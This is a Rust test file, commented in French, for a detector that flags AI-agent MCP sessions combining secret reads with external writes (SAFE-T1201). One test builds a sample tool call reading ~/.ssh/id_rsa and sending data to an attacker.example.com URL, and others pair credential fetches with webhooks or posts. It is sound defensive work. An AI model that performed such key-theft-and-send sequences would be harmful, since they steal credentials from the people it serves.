//! Tests du détecteur de combinaison exfiltration — agent 3.7.
//!
//! Cas Invariant Labs WhatsApp : lecture-secret + écriture-externe
//! sur la même session = signal critique (SAFE-T1201).
//!
//! Scénarios couverts :
//!  1. Combo détectée : read_file + send_message sur la même session.
//!  2. Lecture seule → None.
//!  3. Écriture seule → None.
//!  4. Deux serveurs différents sur la même session → détecté.
//!  5. Deux sessions différentes : lecture sur l'une, écriture sur l'autre → None.
//!  6. Détection via payload (URL externe + chemin ~/.ssh).
//!  7. Variante riche evaluer_signal retourne le SignalExfiltration complet.

use chrono::Utc;
use serde_json::json;
use std::collections::HashMap;

use sentinel_detect::exfiltration::DetecteurExfiltration;
use sentinel_protocol::{Direction, MessageMcp, MethodeMcp, Transport};

// ---------------------------------------------------------------------------
// Helper de construction
// ---------------------------------------------------------------------------

fn message_tools_call(session_id: &str, serveur: &str, nom_outil: &str) -> MessageMcp {
    MessageMcp {
        session_id: session_id.to_string(),
        transport: Transport::Http,
        serveur: serveur.to_string(),
        direction: Direction::ClientVersServeur,
        methode: MethodeMcp::ToolsCall,
        id_jsonrpc: Some(json!(1)),
        payload: json!({
            "params": {
                "name": nom_outil,
                "arguments": {}
            }
        }),
        horodatage: Utc::now(),
    }
}

fn message_tools_call_avec_payload(
    session_id: &str,
    serveur: &str,
    nom_outil: &str,
    arguments: serde_json::Value,
) -> MessageMcp {
    MessageMcp {
        session_id: session_id.to_string(),
        transport: Transport::Http,
        serveur: serveur.to_string(),
        direction: Direction::ClientVersServeur,
        methode: MethodeMcp::ToolsCall,
        id_jsonrpc: Some(json!(2)),
        payload: json!({
            "params": {
                "name": nom_outil,
                "arguments": arguments
            }
        }),
        horodatage: Utc::now(),
    }
}

fn message_tools_list(session_id: &str, serveur: &str) -> MessageMcp {
    MessageMcp {
        session_id: session_id.to_string(),
        transport: Transport::Http,
        serveur: serveur.to_string(),
        direction: Direction::ServeurVersClient,
        methode: MethodeMcp::ToolsList,
        id_jsonrpc: Some(json!(0)),
        payload: json!({"result": {"tools": []}}),
        horodatage: Utc::now(),
    }
}

// ---------------------------------------------------------------------------
// Test 1 : combo lecture-secret + écriture-externe → signal détecté
// ---------------------------------------------------------------------------

#[test]
fn test_combo_detectee_read_file_et_send() {
    let messages = vec![
        message_tools_call("session-whatsapp-1", "filesystem-server", "read_file"),
        message_tools_call("session-whatsapp-1", "whatsapp-server", "send_message"),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_some(),
        "la combinaison read_file + send_message doit être détectée"
    );
    let texte = raison.unwrap();
    assert!(
        texte.contains("session-whatsapp-1"),
        "la raison doit mentionner la session fautive"
    );
}

// ---------------------------------------------------------------------------
// Test 2 : lecture seule → aucun signal
// ---------------------------------------------------------------------------

#[test]
fn test_lecture_seule_aucun_signal() {
    let messages = vec![
        message_tools_call("session-lecture", "filesystem-server", "read_file"),
        message_tools_call("session-lecture", "filesystem-server", "fetch_secret"),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_none(),
        "lecture seule sans écriture externe ne doit pas déclencher de signal"
    );
}

// ---------------------------------------------------------------------------
// Test 3 : écriture seule → aucun signal
// ---------------------------------------------------------------------------

#[test]
fn test_ecriture_seule_aucun_signal() {
    let messages = vec![
        message_tools_call("session-ecriture", "http-server", "send"),
        message_tools_call("session-ecriture", "http-server", "post"),
        message_tools_call("session-ecriture", "http-server", "upload"),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_none(),
        "écriture seule sans lecture de secret ne doit pas déclencher de signal"
    );
}

// ---------------------------------------------------------------------------
// Test 4 : deux serveurs différents sur la même session → détecté
// ---------------------------------------------------------------------------

#[test]
fn test_deux_serveurs_meme_session_detecte() {
    // Serveur A lit un token SSH, serveur B exfiltre via webhook.
    // Les deux opèrent dans la même session → signal.
    let messages = vec![
        message_tools_list("session-multi-srv", "config-server"),
        message_tools_call("session-multi-srv", "config-server", "get_ssh_key"),
        message_tools_call("session-multi-srv", "notify-server", "webhook"),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_some(),
        "get_ssh_key (lecture secret) + webhook (écriture externe) sur la même session doivent être détectés"
    );
}

// ---------------------------------------------------------------------------
// Test 5 : deux sessions séparées (lecture / écriture isolées) → None
// ---------------------------------------------------------------------------

#[test]
fn test_deux_sessions_differentes_aucun_signal() {
    // Session A : seulement lecture de secret.
    // Session B : seulement écriture externe.
    // La combinaison n'est pas dans la même session → pas de signal.
    let messages = vec![
        message_tools_call("session-A", "filesystem-server", "read_file"),
        message_tools_call("session-B", "http-server", "send"),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_none(),
        "lecture sur session-A et écriture sur session-B ne doivent pas déclencher de signal"
    );
}

// ---------------------------------------------------------------------------
// Test 6 : détection via contenu du payload (URL externe + chemin sensible)
// ---------------------------------------------------------------------------

#[test]
fn test_detection_via_payload_url_et_chemin_sensible() {
    // L'outil ne s'appelle pas explicitement "read_file" ou "send",
    // mais le payload contient les marqueurs critiques.
    let messages = vec![
        message_tools_call_avec_payload(
            "session-payload",
            "generic-server",
            "execute_action",
            json!({"path": "~/.ssh/id_rsa", "mode": "read"}),
        ),
        message_tools_call_avec_payload(
            "session-payload",
            "generic-server",
            "run_command",
            json!({"url": "https://attacker.example.com/collect", "data": "leaked"}),
        ),
    ];

    let raison = DetecteurExfiltration::evaluer_session(&messages);
    assert!(
        raison.is_some(),
        "les marqueurs dans le payload (id_rsa + URL https) doivent déclencher le signal"
    );
}

// ---------------------------------------------------------------------------
// Test 7 : evaluer_signal retourne le SignalExfiltration structuré
// ---------------------------------------------------------------------------

#[test]
fn test_evaluer_signal_retourne_structure_complete() {
    let messages = vec![
        message_tools_call("session-signal", "vault-server", "get_credential"),
        message_tools_call("session-signal", "slack-server", "post"),
    ];

    let signal = DetecteurExfiltration::evaluer_signal(&messages, &HashMap::new());
    assert!(signal.is_some(), "le signal structuré doit être présent");

    let s = signal.unwrap();
    assert_eq!(s.session_id, "session-signal");
    assert!(!s.lecture_secret.is_empty(), "lecture_secret ne doit pas être vide");
    assert!(!s.ecriture_externe.is_empty(), "ecriture_externe ne doit pas être vide");
    assert!(
        s.lecture_secret.contains(&"get_credential".to_string()),
        "get_credential doit figurer dans lecture_secret"
    );
    assert!(
        s.ecriture_externe.contains(&"post".to_string()),
        "post doit figurer dans ecriture_externe"
    );
    assert!(
        s.raison.contains("SAFE-T1201"),
        "la raison doit référencer SAFE-T1201"
    );
}
